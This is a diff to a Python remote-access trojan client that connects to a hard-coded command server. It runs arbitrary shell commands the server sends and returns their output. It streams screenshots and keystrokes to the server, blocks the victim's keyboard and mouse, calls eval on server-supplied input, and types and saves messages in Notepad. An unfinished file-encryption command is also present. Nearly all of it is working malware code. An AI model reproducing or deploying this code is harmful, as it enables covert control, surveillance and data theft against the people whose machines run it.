@@ -2,27 +2,38 @@ import socketio
 import atexit
 from time import sleep
 import os
-from playsound import playsound
 import pytz
+import tkinter as tk
 import urllib
 import requests
 import codecs
-from pynput import keyboard
+try:
+  import win32gui
+except:
+  pass
 import requests
+from pygame import mixer
 import json
+import asyncio
 import threading
 import platform
+try:
+  #from pynput.mouse import Controller
+  pass
+except:
+  pass
 from tkinter.simpledialog import askstring
 import webbrowser
 import time
 import sys
+import random
 from datetime import datetime
 import json
 import getpass
 import tempfile
+import keyboard
 from PIL import ImageGrab
 import requests
-import keyboard
 import tkinter.messagebox as tkm
 import tkinter#​
 import subprocess
@@ -30,15 +41,28 @@ from cryptography.fernet import Fernet
 import io
 import pyscreenshot as imagegrab
 
+mouse_input_enabled = True
 STORAGE_SERVER = 'https://storageserver.posydon.repl.co'
 MAIN_SERVER = 'https://dumbledoor.posydon.repl.co'
 TOKEN = 'f056c72b2110f7'
+try:
+  mouse_controller = Controller() # starting mouse controller
+except:
+  pass
 
 sio = socketio.Client() #conecting to server
 sio.connect(MAIN_SERVER, wait_timeout = 10)
 
-with open('id.txt', 'r') as file:
-  id = file.read()#reading file with snape client identification
+#reading file with snape client identification
+try:
+  with open('id.txt', 'r') as file:
+    id = file.read()
+except:
+  with open('id.txt', 'w') as file:
+    id_temp = ''
+    for i in range(0, 10):
+      id_temp+=str(random.randint(0, 9)+";")
+    file.write(id_temp)
   file.close()
 
 #start socketio client event handlers:
@@ -57,9 +81,12 @@ def on_my_response(data):
 @sio.on('shell')
 def shell(data):
   if data['id'] == id:
-    output = subprocess.check_output(data['command'], shell=True)
-    output_str = output.decode('utf-8')
-    sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': id})
+    try:
+      output = subprocess.check_output(data['command'], shell=True)
+      output_str = output.decode('utf-8')
+      sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': id})
+    except Exception as e:
+      sio.emit('response', data={'output': str(e)+"\n'Bad Dobby! Bad Dobby!'", 'command': data['command'], 'id': id}) 
 
 #handler for curses
 @sio.on('command')
@@ -79,14 +106,20 @@ def command(data):
       param3 = data['param3']
     except:
       param3 = None
+    try:
+      param4 = data['param4']
+    except:
+      param4 = None
     for i in range(0, int(data['repeat'])):
-      execute(command, param1, param2, param3)
+      execution_thread = threading.Thread(target=execute, args=[command, param1, param2, param3, param4], daemon=True)
+      execution_thread.start()
 
 #End socketio event client handlers, start curse sorting and execution
-def execute(command, param1, param2, param3):
+def execute(command, param1, param2, param3, param4):
+  global listener
   match command:
     case 'msgbox':
-      sio.emit('response', data={'output': 'http 69', 'command': 'msgbox', 'id': id})
+      dobby69(command)
       msg(param1, param2, param3)
       
     case 'encrypt':
@@ -94,15 +127,43 @@ def execute(command, param1, param2, param3):
         param1 = os.getcwd()
       #encrypt(param1, param2)
       #in development
+
     case 'screen-feed':
       start_screen_feed()
       
     case 'screenshot':
-      print('screenshot')
       screenshot()
-      print('screenshot done ')
+
     case 'sound':
-      play_sound(param1)
+      print('sound selected')
+      play_sound()
+
+    case 'dio':
+      dobby69(command)
+      diologue_top(param1, param2)
+
+    case 'keyboard-write':
+      keyboard_write(param1)
+    
+    case 'keyboard_send':
+      keyboard_send(param1)
+
+    case 'keyboard_message':
+      print(param1, param2, param3, param4)
+      write_message(text=param1, delay=param2, save=eval(param3), name=param4)
+
+    case 'mouse_disable':
+      disable_mouse_input()
+
+    case 'mouse_enable':
+      enable_mouse_input()
+
+    case 'temp':
+      temp()
+
+    case 'open_url':
+      url_open(param1)
+
 
 #End curse sorting, start dumbledoor server-communication functions
       
@@ -112,6 +173,8 @@ def execute(command, param1, param2, param3):
 def send_log(data):
   sio.emit('log', data={'content': data})
 
+def dobby69(command): #arbitrary time response warning (dobby 69 response code)
+  sio.emit('response', data={'output': 'dobby 69', 'command': command, 'id': id})
 #for sending data that will be delivered speedily
 #and does not risk disrupting dumbledoor terminal
 def respond(data):
@@ -120,16 +183,64 @@ def respond(data):
 #End communication functions, start main curse function definitions:
 def url_open(url):
   webbrowser.open(url)
-
-def play_sound(url):
-  mp3_url = url
-  mp3_file = urllib.request.urlretrieve(mp3_url)[0]
-  with open(mp3_file, 'rb') as f:
-      playsound(f)
-  os.remove(mp3_file)
   
+def wait_keyboard():
+  for i in range(150):
+    keyboard.block_key(i) 
+    
+def play_music(file):
+  mixer.init()
+  mixer.music.load(file)
+  mixer.music.play()
+  return 1
+
+def play_sound():
+  response = requests.get(f"{MAIN_SERVER}/mp3")
+  if response.status_code == 200:
+      with open('file.mp3', 'wb') as f:
+          f.write(response.content)
+          send_log(f'{id}: File downloaded successfully')
+  else:
+      send_log(f'{id}: Failed to download file')
+  send_log(f"mp3 file played with exit code: {play_music('file.mp3')}")
+  os.remove('file.mp3')
+
+def on_move(x, y):
+    global mouse_input_enabled
+    return mouse_input_enabled
+
+# Mouse click event handler
+def on_click(x, y, button, pressed):
+    global mouse_input_enabled
+    return mouse_input_enabled
+
+# Mouse scroll event handler
+def on_scroll(x, y, dx, dy):
+    global mouse_input_enabled
+    return mouse_input_enabled
+
+# Mouse listener instance
+# listener = mouse.Listener(
+#     on_move=on_move,
+#     on_click=on_click,
+#     on_scroll=on_scroll
+# )
+
+# Function to disable mouse input
+def disable_mouse_input():
+    global listener, mouse_input_enabled
+    mouse_input_enabled = False
+    listener.stop()
+
+# Function to enable mouse input
+def enable_mouse_input():
+    global listener, mouse_input_enabled
+    mouse_input_enabled = True
+    listener.start()
+
 def temp():
   os.chdir(tempfile.gettempdir())
+
 def start_screen_feed():
   while True:
       # Capture a screenshot of the screen
@@ -147,13 +258,35 @@ def start_screen_feed():
       time.sleep(0.1)
 
 def diologue_top(title, message):
-  sio.emit('response', data={'output': 'http 69; output will be saved in log'})
   root = tkinter.Tk()
   root.wm_attributes('-topmost', 1)
   root.withdraw()
   prompt = askstring(title, message, parent=root)
   send_log(f"user response: {prompt}")
   root.destroy()
+
+def keyboard_write(text):
+  keyboard.write(text, delay=0.2)
+
+def keyboard_send(shortcut):
+  keyboard.send(shortcut)
+
+def write_message(text, delay, save=False, name="README", editor="notepad"):
+  os.system("START " + editor)
+  sleep(0.4)  # Wait for Notepad to open
+  notepad_handle = win32gui.FindWindow(None, "Untitled - Notepad")  # Find the handle of the Notepad window
+  win32gui.SetForegroundWindow(notepad_handle)  # Set Notepad window to foreground
+  keyboard.write(text, delay=float(delay))
+  if save:
+    keyboard.send("ctrl+s")
+    sleep(0.5)
+    keyboard.write(name)
+    keyboard.send("enter")
+  else:
+    pass
+
+
+
 
 def screenshot():
   global id
@@ -181,36 +314,34 @@ def msg(title, message, type):
     elif type == 'warning':
       tkm.showwarning(title, message, parent=root)
     root.destroy()
+    send_log(f"client {id} closed messagebox>[\n\ttype: {type}\n\ttitle: {title}\n\tmessage: {message}\n]")
   except Exception as e:
     sio.emit('response', data={'output': f"error: {e}"})
 #keylogger functions: 
-def start_keylogger():
-  keystrokes = []
-  def on_press(key):
-    try:
-      keystrokes.append(key.char)
-    except AttributeError:
-      keystrokes.append(str(key))
-      
-  def send_keystrokes():
-    data = {"keystrokes": keystrokes}
-    headers = {"Content-Type": "application/json"}
-    response = requests.post("http://your_flask_server_url", data=json.dumps(data), headers=headers)
-    if response.status_code == 200:
-      print("Keystrokes sent successfully!")
-    else:
-      print("Failed to send keystrokes.")
 
-  with keyboard.Listener(on_press=on_press) as listener:
-    def send_keystrokes_timer():
-      send_keystrokes()
-      threading.Timer(10, send_keystrokes_timer).start()
+def send_key(key):
+    data = {'key': key}
+    response = requests.post(MAIN_SERVER + '/key', json=data)
+    if response.status_code != 200:
+        print('Error sending key:', response.text)
 
-    threading.Timer(0, send_keystrokes_timer).start()
-    listener.join()
+def handle_keypress(event):
+    send_key(event.char)
+
+def main_keylogger():
+    # Create a hidden Tkinter window
+    root = tk.Tk()
+    root.withdraw()
+    # Bind the key press event to the handle_keypress function
+    root.bind('<Key>', handle_keypress)
+    # Wait for a variable to change (this will block the program)
+    tk.mainloop()
+
+def open_url(url):
+  webbrowser.open(url, 2, True)
 #End main curse functions, start server check-in loop
-keylogger_thread = threading.Thread(target=start_keylogger)
-keylogger_thread.start()
+
+
 while True:
   tz_NY = pytz.timezone('America/New_York')
   datetime_NY = datetime.now(tz_NY)
